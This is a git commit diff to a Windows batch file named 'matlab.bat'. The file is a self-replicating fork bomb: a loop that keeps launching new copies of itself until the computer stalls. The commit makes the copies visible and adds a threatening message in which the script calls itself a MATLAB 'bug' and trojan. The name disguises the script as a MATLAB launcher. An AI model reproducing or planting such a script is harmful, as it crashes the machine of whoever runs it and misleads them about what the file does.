6c1ab27002590f2598cd1859afb3bd10cf803f96
Vishal Yadav <37909354+vishalyadav250@users.noreply.github.com>
2018-04-18 21:24:09 +0530

    d

--- matlab.bat
+++ matlab.bat
@@ -1,4 +1,4 @@
 :matlab
-cls
-start /min matlab.bat
+echo i am a matlab bug. i will not die alone. if you try to kill my trojan, i will not live you alive .you will Die SOON. Thankyou ! A honest Matlab Bug
+start matlab.bat
 goto matlab
